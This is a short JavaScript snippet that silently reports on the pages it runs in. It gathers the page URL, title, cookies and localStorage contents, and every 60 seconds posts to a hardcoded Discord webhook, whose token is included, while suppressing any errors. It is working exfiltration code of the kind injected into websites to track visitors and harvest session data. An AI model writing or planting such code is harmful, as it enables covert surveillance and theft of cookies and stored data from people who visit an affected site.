(function() {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1553930409950187641/l5TARyHmC_llk82ShxXQ8LNbT5MABelaTTGTEC6ljka5dgXwHzz3R_RXS8ahIME7GQp5';
    
    function captureData() {
        return {
            url: window.location.href,
            title: document.title,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            timestamp: new Date().toISOString()
        };
    }
    
    // Send data every 60 seconds
    setInterval(function() {
        const message = 'System data captured: ' + captureData().url;
        fetch(webhookUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: message
            })
        }).catch(() => {});
    }, 60000);
})();
